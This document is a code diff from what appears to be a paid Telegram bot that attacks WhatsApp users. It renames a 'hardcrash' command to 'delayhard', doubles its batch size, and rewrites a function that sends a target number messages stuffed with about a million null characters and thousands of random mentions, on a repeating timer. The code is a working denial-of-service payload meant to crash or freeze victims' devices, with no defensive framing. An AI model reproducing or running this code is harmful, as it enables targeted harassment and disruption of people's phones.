@@ -5930,7 +5930,7 @@ FAILED
         }
 });
 
-bot.command("hardcrash", checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
+bot.command("delayhard", checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
 
         try {
 
@@ -6006,7 +6006,7 @@ Supported Duration :
                     x =>
 
                     x.type ===
-                        "hardcrash"
+                        "delayhard"
 
                     &&
 
@@ -6037,11 +6037,11 @@ ${clean}
 
             const task = {
                 id: Date.now(),
-                type: "hardcrash",
+                type: "delayhard",
                 target,
                 number: clean,
                 interval: 300000,
-                batch: 10,
+                batch: 20,
                 createdAt: Date.now(),
                 endTime: Date.now() + ms,
                 lastRun: 0,
@@ -6257,7 +6257,7 @@ function compareVersions(v1, v2) {
 async function executeTask(task) {
     switch (task.type) {
 
-        case "hardcrash":
+        case "delayhard":
 
             let success = 0;
             let failed = 0;
@@ -6270,7 +6270,7 @@ async function executeTask(task) {
         
                 try {
         
-                    await VogueInvisCrash(
+                    await VogueSpamInvis(
                         sock,
                         task.target
                     );
@@ -7063,54 +7063,94 @@ async function Ipongforcloseivs(sock, target) {
 };
 
 async function VogueSpamInvis(sock, target) {
-  try {
-    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];    
-    for (const x of type) {
-      const enty = Math.floor(Math.random() * type.length);
-      const msg = generateWAMessageFromContent(
-        target,
-        {
-          viewOnceMessage: {
-            message: {
-              interactiveResponseMessage: {
-                body: {
-                  text: "\u0003",
-                  format: "DEFAULT"
-                },
-                nativeFlowResponseMessage: {
-                  name: x,
-                  paramsJson: "\x10".repeat(1000000),
-                  version: 3
-                },
-                entryPointConversionSource: type[enty]
+  await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "MakLo",
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: "\u0000".repeat(1045000),
+            version: 3
+          }, 
+        }
+      }
+    }
+  }, { participant: { jid: target }});
+  
+await sleep(300);
+
+  await sock.relayMessage(target, {
+    groupStatusMessageV2: { 
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "MakLo",
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "galaxy_message",
+            paramsJson: "\u0000".repeat(1045000),
+            version: 3
+          }, 
+        }
+      }
+    }
+  }, { participant: { jid: target }});
+
+await sleep(300);
+
+  await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "MakLo",
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "address_message",
+            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
+            version: 3
+          },
+          contextInfo: {
+            quotedMessage: {
+              paymentInviteMessage: {
+                serviceType: 2,
+                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
               }
             }
           }
-        },
-        {
-          participant: { jid: target }
         }
-      );
-      
-      await sock.relayMessage(
-        target,
-        {
-          groupStatusMessageV2: {
-            message: msg.message
-          }
-        },
-        {
-          messageId: msg.key.id,
-          participant: { jid: target }
-        }
-      );
-      
-      await new Promise(resolve => setTimeout(resolve, 1000));
+      }
     }
-  } catch (err) {
-    await console.error(`${err.message}`);
-  }
-}
+  }, { participant: { jid: target }});
+  
+await sleep(300);
+  
+await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: {
+     extendedTextMessage: {
+       text: "\u0000".repeat(500000),
+         contextInfo: {
+           participant: target,
+             mentionedJid: [
+               "0@s.whatsapp.net",
+                  ...Array.from(
+                  { length: 1950 },
+                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
+                 )
+               ]
+             }
+           }
+         }
+       }
+     }, { participant: { jid: target }});
+   }
 
 async function VogueBuldo(sock, target) {
     const totalAttack = 10;
